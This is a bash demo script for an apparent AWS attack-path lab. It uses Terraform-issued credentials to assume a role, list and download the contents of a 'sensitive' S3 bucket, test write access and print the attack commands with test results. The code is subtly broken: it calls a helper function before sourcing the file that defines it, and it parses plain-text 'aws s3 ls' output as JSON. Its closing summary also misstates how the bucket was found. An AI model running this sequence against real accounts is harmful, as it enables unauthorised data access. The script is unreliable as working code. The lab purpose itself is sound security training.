#!/bin/bash

# Demo script for prod_role_has_exclusive_access_to_bucket_through_resource_policy module
# This script demonstrates how a role with minimal permissions can access an S3 bucket
# through a restrictive resource-based policy that denies access to everyone else


# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

# Display a command before executing it
show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

# Display AND record an attack command
show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

echo -e "${BLUE}=== Exclusive S3 Bucket Access Through Restrictive Resource Policy Attack Demo ===${NC}"
echo "This demo shows how a role with minimal permissions can access an S3 bucket"
echo "through a restrictive resource-based policy that explicitly denies access to everyone else."
echo ""

# Check if AWS CLI is installed
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi

# Navigate to the Terraform root directory (4 levels up from scenario directory)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TERRAFORM_ROOT="$(cd "$SCRIPT_DIR/../../../.." && pwd)"

echo "🔍 Retrieving credentials from Terraform outputs..."
cd "$TERRAFORM_ROOT"

# Get the grouped module output
MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.tool_testing_exclusive_resource_policy.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}❌ Error: Could not retrieve module outputs. Make sure the scenario is deployed.${NC}"
    exit 1
fi

# Extract credentials and resource information from grouped output
STARTING_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_access_key_id')
STARTING_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_secret_access_key')
EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN=$(echo "$MODULE_OUTPUT" | jq -r '.exclusive_bucket_access_role_arn')
EXCLUSIVE_SENSITIVE_BUCKET=$(echo "$MODULE_OUTPUT" | jq -r '.exclusive_sensitive_bucket_name')
STARTING_USER_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.starting_user_name')

READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)

if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
    exit 1
fi

# Restore helpful permissions for manual exploration
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

echo -e "${GREEN}✅ Retrieved credentials for starting user: $STARTING_USER_NAME${NC}"
echo "📋 Exclusive Bucket Access Role ARN: $EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN"
echo "📋 Exclusive Sensitive Bucket: $EXCLUSIVE_SENSITIVE_BUCKET"

cd - > /dev/null

# Credential switching helpers
use_starting_creds() {
    export AWS_ACCESS_KEY_ID="$STARTING_ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$STARTING_SECRET_ACCESS_KEY"
    unset AWS_SESSION_TOKEN
}
use_readonly_creds() {
    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
    unset AWS_SESSION_TOKEN
}

# Source demo permissions library for validation restriction
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../scripts/lib/demo_permissions.sh"

# Restrict helpful permissions during validation run
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

export AWS_DEFAULT_REGION="us-west-2"

# [OBSERVATION] Step 1: Verify current identity
echo -e "${YELLOW}Step 1: Verifying current identity${NC}"
use_readonly_creds
show_cmd "ReadOnly" "aws sts get-caller-identity --output json"
CURRENT_IDENTITY=$(aws sts get-caller-identity --output json)
echo "Current identity:"
echo "$CURRENT_IDENTITY" | jq '.'
echo ""

# Check if we're running as the pathfinding starting user
CURRENT_USER=$(echo "$CURRENT_IDENTITY" | jq -r '.Arn' | cut -d'/' -f2)
if [ "$CURRENT_USER" != "pl-pathfinding-starting-user-prod" ]; then
    echo -e "${YELLOW}Note: This demo should be run as the pl-pathfinding-starting-user-prod user for full effect${NC}"
    echo "Current user: $CURRENT_USER"
    echo ""
fi

# Get account ID
ACCOUNT_ID=$(echo "$CURRENT_IDENTITY" | jq -r '.Account')
echo "Current account: $ACCOUNT_ID"

# [OBSERVATION] Step 2: Test initial permissions (should be limited)
echo -e "${YELLOW}Step 2: Testing initial permissions (should be limited)${NC}"
echo "Testing what we can access with current permissions..."
use_readonly_creds

# Test S3 access with current permissions
echo "Attempting to list all S3 buckets..."
show_cmd "ReadOnly" "aws s3api list-buckets --output json"
if BUCKETS=$(aws s3api list-buckets --output json 2>/dev/null); then
    echo -e "${GREEN}✓ Can list S3 buckets${NC}"
    echo "Available buckets:"
    echo "$BUCKETS" | jq -r '.Buckets[].Name' | while read -r bucket; do
        echo "  - $bucket"
    done
else
    echo -e "${RED}✗ Cannot list S3 buckets${NC}"
    echo "This suggests the current user doesn't have s3:ListAllMyBuckets permission"
fi

echo ""
# [EXPLOIT] Step 3: Assume the exclusive bucket access role
echo -e "${YELLOW}Step 3: Assuming the exclusive bucket access role${NC}"
echo "Attempting to assume role: $EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN"
use_starting_creds

show_attack_cmd "Attacker" "aws sts assume-role --role-arn \"$EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN\" --role-session-name \"exclusive-bucket-access-session\" --output json"
if EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS=$(aws sts assume-role --role-arn "$EXCLUSIVE_BUCKET_ACCESS_ROLE_ARN" --role-session-name "exclusive-bucket-access-session" --output json 2>&1); then
    echo -e "${GREEN}✓ Successfully assumed exclusive bucket access role!${NC}"
    echo ""

    # Extract the credentials
    ACCESS_KEY_ID=$(echo "$EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS" | jq -r '.Credentials.AccessKeyId')
    SECRET_ACCESS_KEY=$(echo "$EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS" | jq -r '.Credentials.SecretAccessKey')
    SESSION_TOKEN=$(echo "$EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS" | jq -r '.Credentials.SessionToken')

    # Set the credentials for the assumed role
    export AWS_ACCESS_KEY_ID="$ACCESS_KEY_ID"
    export AWS_SECRET_ACCESS_KEY="$SECRET_ACCESS_KEY"
    export AWS_SESSION_TOKEN="$SESSION_TOKEN"

    echo -e "${YELLOW}Step 4: Testing role permissions (should be limited to ListAllMyBuckets)${NC}"
    echo "Testing what the assumed role can access..."

    # Test S3 access with assumed role
    echo "Attempting to list all S3 buckets with assumed role..."
    show_cmd "Attacker" "aws s3api list-buckets --output json"
    if ASSUMED_BUCKETS=$(aws s3api list-buckets --output json 2>/dev/null); then
        echo -e "${GREEN}✓ Can list S3 buckets with assumed role${NC}"
        echo "Available buckets:"
        echo "$ASSUMED_BUCKETS" | jq -r '.Buckets[].Name' | while read -r bucket; do
            echo "  - $bucket"
        done
    else
        echo -e "${RED}✗ Cannot list S3 buckets with assumed role${NC}"
    fi

    # Try to access a specific bucket (this should fail due to IAM restrictions)
    echo ""
    echo "Attempting to access a specific bucket (should fail due to IAM restrictions)..."
    show_cmd "Attacker" "aws s3 ls s3://some-bucket-that-doesnt-exist/"
    if aws s3 ls s3://some-bucket-that-doesnt-exist/ 2>/dev/null; then
        echo -e "${GREEN}✓ Can access specific bucket (unexpected)${NC}"
    else
        echo -e "${YELLOW}⚠ Cannot access specific bucket (expected due to IAM restrictions)${NC}"
    fi

    echo ""
    echo -e "${YELLOW}Step 5: Accessing the exclusive sensitive bucket through resource policy${NC}"
    echo "Exclusive sensitive bucket: $EXCLUSIVE_SENSITIVE_BUCKET"

    if [ -n "$EXCLUSIVE_SENSITIVE_BUCKET" ]; then
        echo -e "${GREEN}✓ Bucket name retrieved from Terraform outputs${NC}"
        echo ""

        echo -e "${YELLOW}Step 6: Accessing exclusive sensitive bucket through restrictive resource policy${NC}"
        echo "Attempting to access the exclusive sensitive bucket (this should work due to resource policy)..."

        # List objects in the exclusive sensitive bucket
        echo "Listing objects in exclusive sensitive bucket..."
        show_attack_cmd "Attacker" "aws s3 ls \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/\" --output json"
        if EXCLUSIVE_SENSITIVE_OBJECTS=$(aws s3 ls "s3://$EXCLUSIVE_SENSITIVE_BUCKET/" --output json 2>/dev/null); then
            echo -e "${GREEN}✓ Successfully listed objects in exclusive sensitive bucket!${NC}"
            echo "Objects found:"
            echo "$EXCLUSIVE_SENSITIVE_OBJECTS" | jq -r '.[] | .Key' | while read -r object; do
                echo "  - $object"
            done
            echo ""

            # Download and read sensitive files
            echo -e "${YELLOW}Step 7: Reading highly sensitive files${NC}"
            echo "Downloading and reading highly sensitive files..."

            # Create a temporary directory for downloads
            TEMP_DIR=$(mktemp -d)

            # Download each sensitive file
            echo "$EXCLUSIVE_SENSITIVE_OBJECTS" | jq -r '.[] | .Key' | while read -r object; do
                echo "Downloading: $object"
                show_attack_cmd "Attacker" "aws s3 cp \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/$object\" \"$TEMP_DIR/$object\""
                if aws s3 cp "s3://$EXCLUSIVE_SENSITIVE_BUCKET/$object" "$TEMP_DIR/$object" 2>/dev/null; then
                    echo -e "${GREEN}✓ Successfully downloaded: $object${NC}"
                    echo "Content preview:"
                    head -3 "$TEMP_DIR/$object" | sed 's/^/  /'
                    echo ""
                else
                    echo -e "${RED}✗ Failed to download: $object${NC}"
                fi
            done

            # Clean up temporary directory
            rm -rf "$TEMP_DIR"

            echo -e "${YELLOW}Step 8: Testing write access to exclusive bucket${NC}"
            echo "Testing if we can write to the exclusive sensitive bucket..."

            # Try to upload a test file
            TEST_FILE="/tmp/exclusive-test-upload-$(date +%s).txt"
            echo "This is a test file uploaded by the exclusive role - should be the only one who can access this" > "$TEST_FILE"

            show_attack_cmd "Attacker" "aws s3 cp \"$TEST_FILE\" \"s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt\""
            if aws s3 cp "$TEST_FILE" "s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt" 2>/dev/null; then
                echo -e "${GREEN}✓ Successfully uploaded test file to exclusive sensitive bucket!${NC}"

                # Verify we can read it back
                echo "Verifying we can read the uploaded file..."
                if aws s3 cp "s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt" "/tmp/verify-exclusive-upload.txt" 2>/dev/null; then
                    echo -e "${GREEN}✓ Successfully read back the uploaded file${NC}"
                    echo "File content:"
                    cat "/tmp/verify-exclusive-upload.txt" | sed 's/^/  /'
                    rm -f "/tmp/verify-exclusive-upload.txt"
                fi

                # Clean up the test file
                aws s3 rm "s3://$EXCLUSIVE_SENSITIVE_BUCKET/exclusive-test-upload.txt" 2>/dev/null || true
                echo "Test file cleaned up"
            else
                echo -e "${RED}✗ Failed to upload test file to exclusive sensitive bucket${NC}"
            fi

            # Clean up local test file
            rm -f "$TEST_FILE"

            echo ""
            echo -e "${YELLOW}Step 9: Demonstrating access restrictions for other users${NC}"
            echo "This bucket has a restrictive policy that denies access to everyone except our role."
            echo "Let's verify this by checking the bucket policy..."

            # Get the bucket policy
            show_cmd "Attacker" "aws s3api get-bucket-policy --bucket \"$EXCLUSIVE_SENSITIVE_BUCKET\" --output json"
            if BUCKET_POLICY=$(aws s3api get-bucket-policy --bucket "$EXCLUSIVE_SENSITIVE_BUCKET" --output json 2>/dev/null); then
                echo -e "${GREEN}✓ Retrieved bucket policy${NC}"
                echo "Bucket policy contains:"
                echo "$BUCKET_POLICY" | jq '.Policy' | jq -r '.' | jq '.Statement[] | {Sid: .Sid, Effect: .Effect, Principal: .Principal, Action: .Action}'
                echo ""
                echo "The policy shows:"
                echo "1. ALLOW access for our specific role"
                echo "2. DENY access for all other principals"
                echo "This demonstrates how resource policies can be more restrictive than IAM policies"
            else
                echo -e "${YELLOW}⚠ Could not retrieve bucket policy (insufficient permissions)${NC}"
            fi

        else
            echo -e "${RED}✗ Failed to list objects in exclusive sensitive bucket${NC}"
            echo "This could be because:"
            echo "1. The bucket doesn't exist"
            echo "2. The resource policy doesn't allow access"
            echo "3. There are other access restrictions"
        fi

    else
        echo -e "${YELLOW}⚠ Exclusive sensitive bucket not found in bucket list${NC}"
        echo "This could be because:"
        echo "1. The bucket hasn't been created yet"
        echo "2. The bucket name doesn't match the expected pattern"
        echo "3. There are other access restrictions"
    fi

    # Unset the credentials
    unset AWS_ACCESS_KEY_ID
    unset AWS_SECRET_ACCESS_KEY
    unset AWS_SESSION_TOKEN

    echo ""
    echo -e "${GREEN}=== ATTACK SUCCESSFUL ===${NC}"
    echo "The attack successfully demonstrated how a role with minimal permissions"
    echo "can access an S3 bucket through a restrictive resource-based policy:"
    echo "1. Assumed a role with only s3:ListAllMyBuckets permission"
    echo "2. Found the exclusive sensitive bucket through listing"
    echo "3. Accessed the exclusive sensitive bucket using the restrictive resource policy"
    echo "4. Read and wrote highly sensitive data despite IAM restrictions"
    echo "5. Demonstrated that the bucket policy denies access to everyone else"
    echo ""

    if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
        echo -e "\n${YELLOW}Attack Commands:${NC}"
        for cmd in "${ATTACK_COMMANDS[@]}"; do
            echo -e "  ${CYAN}\$ ${cmd}${NC}"
        done
    fi

    # Output standardized test results
    echo "TEST_RESULT:prod_role_has_exclusive_access_to_bucket_through_resource_policy:SUCCESS"
    echo "TEST_DETAILS:prod_role_has_exclusive_access_to_bucket_through_resource_policy:Successfully demonstrated exclusive S3 bucket access through restrictive resource policy"
    echo "TEST_METRICS:prod_role_has_exclusive_access_to_bucket_through_resource_policy:role_assumed=true,bucket_found=true,objects_listed=true,files_downloaded=true,write_access_confirmed=true,restrictive_policy_verified=true"

else
    echo -e "${RED}✗ Failed to assume exclusive bucket access role${NC}"
    echo "Error: $EXCLUSIVE_BUCKET_ACCESS_CREDENTIALS"
    echo ""
    echo "This could be because:"
    echo "1. The current user doesn't have permission to assume the role"
    echo "2. The role doesn't exist"
    echo "3. There's a trust policy issue"
    echo ""
    echo "TEST_RESULT:prod_role_has_exclusive_access_to_bucket_through_resource_policy:FAILURE"
    echo "TEST_DETAILS:prod_role_has_exclusive_access_to_bucket_through_resource_policy:Failed to assume exclusive bucket access role"
    echo "TEST_METRICS:prod_role_has_exclusive_access_to_bucket_through_resource_policy:role_assumption_failed=true"
    exit 1
fi

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
